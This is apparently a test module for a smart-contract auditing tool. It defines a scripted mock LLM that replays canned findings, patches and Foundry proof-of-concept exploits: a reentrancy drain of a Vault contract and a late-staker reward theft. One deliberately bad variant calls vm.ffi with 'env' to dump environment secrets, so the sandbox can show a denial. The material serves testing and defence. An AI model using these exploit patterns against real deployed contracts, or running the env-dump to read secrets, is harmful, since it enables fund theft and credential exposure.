"""SCRIPTED (mock) LLM for tests and sample runs. Not a model: it replays hand-written answers.

Everything downstream of the model text (forge execution, confirmation, patch validation, scanner,
firewall) is real. Runs produced with this are flagged `scripted=True` and shown as SAMPLE in the UI.
Token counts are 0 because no model was called.
"""
from __future__ import annotations

import time

from redline.config import ROOT
from redline.llm import CallStat
from redline.models import FileEdit, Finding, JudgeOut, PatchDraft, PoCDraft, ReconOut, ScanOut

VAULT_POC = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attacker {
    Vault v;
    constructor(Vault _v) { v = _v; }
    function attack() external payable {
        v.deposit{value: 1 ether}();
        v.withdraw(1 ether);
    }
    receive() external payable {
        if (address(v).balance >= 1 ether) v.withdraw(1 ether);
    }
}

contract ExploitF1 is Test {
    function test_exploit() public {
        Vault v = new Vault();
        vm.deal(address(0xB0B), 10 ether);
        vm.prank(address(0xB0B));
        v.deposit{value: 10 ether}();
        Attacker a = new Attacker(v);
        vm.deal(address(a), 1 ether);
        a.attack{value: 0}();
        assertGt(address(a).balance, 1 ether);
    }
}
'''

VAULT_FIXED = (ROOT / "fixtures/vulnerable-vault/src/Vault.sol").read_text().replace(
    '''        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");
        unchecked {
            balances[msg.sender] -= amount;
        }''', '''        balances[msg.sender] -= amount;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");''')

STAKE_POC = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import "../src/Staking.sol";
import "../src/MockToken.sol";

contract ExploitF1 is Test {
    function test_exploit() public {
        MockToken stk = new MockToken();
        MockToken rwd = new MockToken();
        StakeRewards s = new StakeRewards(IERC20(address(stk)), IERC20(address(rwd)), 1e18);
        rwd.mint(address(s), 1_000_000e18);
        address alice = address(0xA11CE);
        address mallory = address(0xBAD);
        stk.mint(alice, 100e18);
        stk.mint(mallory, 100e18);
        vm.prank(alice);
        stk.approve(address(s), type(uint256).max);
        vm.prank(mallory);
        stk.approve(address(s), type(uint256).max);
        vm.prank(alice);
        s.stake(100e18);
        skip(100);
        vm.startPrank(mallory);
        s.stake(100e18); // joins late, same block as claim
        s.claim();
        vm.stopPrank();
        assertGt(rwd.balanceOf(mallory), 0, "late staker claimed rewards accrued before joining");
    }
}
'''

# first attempt tries a forbidden cheatcode so the sample shows a real gate denial
STAKE_POC_BAD = STAKE_POC.replace(
    "        skip(100);",
    '        skip(100);\n        string[] memory cmd = new string[](1);\n        cmd[0] = "env";\n        vm.ffi(cmd);')

STAKE_FIXED = (ROOT / "fixtures/poisoned-repo/src/Staking.sol").read_text().replace(
    "function stake(uint256 amt) external {", "function stake(uint256 amt) external update(msg.sender) {")

SCENARIOS = {
    "vulnerable-vault": dict(
        finding=Finding(id="F1", title="Reentrancy in Vault.withdraw", severity="high",
                        file="src/Vault.sol", function="withdraw",
                        description="withdraw() sends ETH before updating balances[msg.sender], "
                                    "so a contract can re-enter withdraw() and drain the vault.",
                        attack="Deposit 1 ETH, call withdraw(1 ether); in receive() call "
                               "withdraw again while balances is not yet decremented.",
                        confidence=0.9),
        pocs=[VAULT_POC], fixed=("src/Vault.sol", VAULT_FIXED), rationale="Checks-effects-interactions"),
    "poisoned-repo": dict(
        finding=Finding(id="F1", title="Late staker steals pre-join rewards", severity="high",
                        file="src/Staking.sol", function="stake",
                        description="stake() changes staked/totalStaked without the update(msg.sender) "
                                    "checkpoint, so a new staker's userRewardPerTokenPaid stays 0 and "
                                    "they can claim rewards accrued before they joined.",
                        attack="Wait for rewards to accrue, stake, then claim in the same block.",
                        confidence=0.9),
        pocs=[STAKE_POC_BAD, STAKE_POC], fixed=("src/Staking.sol", STAKE_FIXED),
        rationale="Checkpoint the account before changing its stake (add update modifier)"),
}


class ScriptedLLM:
    provider = "mock"

    def __init__(self, scenario: str = "vulnerable-vault", no_findings: bool = False):
        self.sc = SCENARIOS[scenario]
        self.no_findings = no_findings
        self.stats: list[CallStat] = []
        self.seen_prompts: list[str] = []
        self._poc_i = 0

    def structured(self, model, messages, schema, role="", **kw):
        t0 = time.perf_counter()
        self.seen_prompts.append(messages[-1]["content"])
        out = self._answer(schema)
        self.stats.append(CallStat("mock", model, role or schema.__name__, 0, 0,
                                   time.perf_counter() - t0))
        return out

    def _answer(self, schema):
        if schema is ScanOut:
            return ScanOut()
        if schema is JudgeOut:
            return JudgeOut(verdict="allow", reason="scripted allow", confidence=1.0)
        if schema is ReconOut:
            return ReconOut(findings=[] if self.no_findings else [self.sc["finding"]])
        if schema is PoCDraft:
            code = self.sc["pocs"][min(self._poc_i, len(self.sc["pocs"]) - 1)]
            self._poc_i += 1
            return PoCDraft(contract_name="ExploitF1", code=code)
        if schema is PatchDraft:
            path, content = self.sc["fixed"]
            return PatchDraft(edits=[FileEdit(path=path, content=content)],
                              rationale=self.sc["rationale"])
        raise AssertionError(schema)
